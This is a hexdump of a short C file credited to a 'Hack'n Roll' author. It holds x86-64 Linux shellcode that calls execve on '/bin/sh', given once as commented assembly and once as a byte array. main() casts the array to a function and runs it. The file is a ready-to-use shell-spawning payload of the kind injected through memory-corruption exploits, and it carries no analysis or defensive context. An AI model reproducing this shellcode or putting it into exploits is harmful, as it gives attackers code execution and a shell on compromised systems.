00000000  2f 2a 0d 0a 41 6e 64 65  72 73 6f 6e 20 45 64 75  |/*..Anderson Edu|
00000010  61 72 64 6f 20 3c 20 63  30 64 33 5f 7a 33 72 30  |ardo < c0d3_z3r0|
00000020  20 3e 0d 0a 48 61 63 6b  27 6e 20 52 6f 6c 6c 0d  | >..Hack'n Roll.|
00000030  0a 68 74 74 70 3a 2f 2f  61 6e 64 65 72 73 6f 6e  |.http://anderson|
00000040  2e 68 61 63 6b 6e 72 6f  6c 6c 2e 63 6f 6d 0d 0a  |.hacknroll.com..|
00000050  68 74 74 70 3a 2f 2f 62  6c 6f 67 2e 68 61 63 6b  |http://blog.hack|
00000060  6e 72 6f 6c 6c 2e 63 6f  6d 20 0d 0a 20 0d 0a 2e  |nroll.com .. ...|
00000070  73 65 63 74 69 6f 6e 20  2e 74 65 78 74 0d 0a 2e  |section .text...|
00000080  67 6c 6f 62 6c 20 5f 73  74 61 72 74 0d 0a 5f 73  |globl _start.._s|
00000090  74 61 72 74 3a 0d 0a 20  0d 0a 0d 0a 20 20 20 20  |tart:.. ....    |
000000a0  20 20 20 20 78 6f 72 20  25 72 63 78 2c 25 72 63  |    xor %rcx,%rc|
000000b0  78 0d 0a 20 20 20 20 20  20 20 20 6a 6d 70 20 73  |x..        jmp s|
000000c0  74 72 69 6e 67 0d 0a 20  0d 0a 20 20 20 20 20 20  |tring.. ..      |
000000d0  20 20 6d 61 69 6e 3a 0d  0a 20 0d 0a 20 20 20 20  |  main:.. ..    |
000000e0  20 20 20 20 70 6f 70 71  20 25 72 73 69 0d 0a 20  |    popq %rsi.. |
000000f0  20 20 20 20 20 20 20 6d  6f 76 71 20 25 72 73 69  |       movq %rsi|
00000100  2c 25 72 64 69 0d 0a 20  0d 0a 20 20 20 20 20 20  |,%rdi.. ..      |
00000110  20 20 70 75 73 68 71 20  25 72 73 69 0d 0a 20 20  |  pushq %rsi..  |
00000120  20 20 20 20 20 20 70 75  73 68 71 20 25 72 63 78  |      pushq %rcx|
00000130  0d 0a 20 20 20 20 20 20  20 20 6d 6f 76 71 20 25  |..        movq %|
00000140  72 73 70 2c 25 72 73 69  0d 0a 20 0d 0a 20 20 20  |rsp,%rsi.. ..   |
00000150  20 20 20 20 20 6d 6f 76  71 20 25 72 63 78 2c 25  |     movq %rcx,%|
00000160  72 64 78 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |rdx..        mov|
00000170  62 20 24 30 78 33 62 2c  25 61 6c 0d 0a 20 20 20  |b $0x3b,%al..   |
00000180  20 20 20 20 20 73 79 73  63 61 6c 6c 0d 0a 20 0d  |     syscall.. .|
00000190  0a 20 20 20 20 20 20 20  20 73 74 72 69 6e 67 3a  |.        string:|
000001a0  0d 0a 20 20 20 20 20 20  20 20 63 61 6c 6c 71 20  |..        callq |
000001b0  6d 61 69 6e 0d 0a 20 20  20 20 20 20 20 20 2e 73  |main..        .s|
000001c0  74 72 69 6e 67 20 22 2f  62 69 6e 2f 73 68 22 0d  |tring "/bin/sh".|
000001d0  0a 20 0d 0a 0d 0a 2a 2f  0d 0a 20 0d 0a 69 6e 74  |. ....*/.. ..int|
000001e0  20 6d 61 69 6e 28 76 6f  69 64 29 0d 0a 7b 0d 0a  | main(void)..{..|
000001f0  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000200  20 3d 0d 0a 22 5c 78 34  38 5c 78 33 31 5c 78 63  | =.."\x48\x31\xc|
00000210  39 22 0d 0a 22 5c 78 65  62 5c 78 31 30 22 0d 0a  |9".."\xeb\x10"..|
00000220  22 5c 78 35 65 22 0d 0a  22 5c 78 34 38 5c 78 38  |"\x5e".."\x48\x8|
00000230  39 5c 78 66 37 22 0d 0a  22 5c 78 35 36 22 0d 0a  |9\xf7".."\x56"..|
00000240  22 5c 78 35 31 22 0d 0a  22 5c 78 34 38 5c 78 38  |"\x51".."\x48\x8|
00000250  39 5c 78 65 36 22 0d 0a  22 5c 78 34 38 5c 78 38  |9\xe6".."\x48\x8|
00000260  39 5c 78 63 61 22 0d 0a  22 5c 78 62 30 5c 78 33  |9\xca".."\xb0\x3|
00000270  62 22 0d 0a 22 5c 78 30  66 5c 78 30 35 22 0d 0a  |b".."\x0f\x05"..|
00000280  22 5c 78 34 38 5c 78 65  38 5c 78 65 61 5c 78 66  |"\x48\xe8\xea\xf|
00000290  66 5c 78 66 66 5c 78 66  66 22 0d 0a 22 5c 78 32  |f\xff\xff".."\x2|
000002a0  66 22 0d 0a 22 5c 78 36  32 22 0d 0a 22 5c 78 36  |f".."\x62".."\x6|
000002b0  39 22 0d 0a 22 5c 78 36  65 22 0d 0a 22 5c 78 32  |9".."\x6e".."\x2|
000002c0  66 22 0d 0a 22 5c 78 37  33 5c 78 36 38 22 3b 0d  |f".."\x73\x68";.|
000002d0  0a 20 0d 0a 20 20 20 20  20 20 20 20 28 2a 28 76  |. ..        (*(v|
000002e0  6f 69 64 20 28 2a 29 28  29 29 20 73 68 65 6c 6c  |oid (*)()) shell|
000002f0  63 6f 64 65 29 28 29 3b  0d 0a 20 0d 0a 2f 2f 48  |code)();.. ..//H|
00000300  61 63 6b 27 6e 20 52 6f  6c 6c 0d 0a 20 0d 0a 72  |ack'n Roll.. ..r|
00000310  65 74 75 72 6e 20 30 3b  0d 0a 7d                 |eturn 0;..}|
0000031b
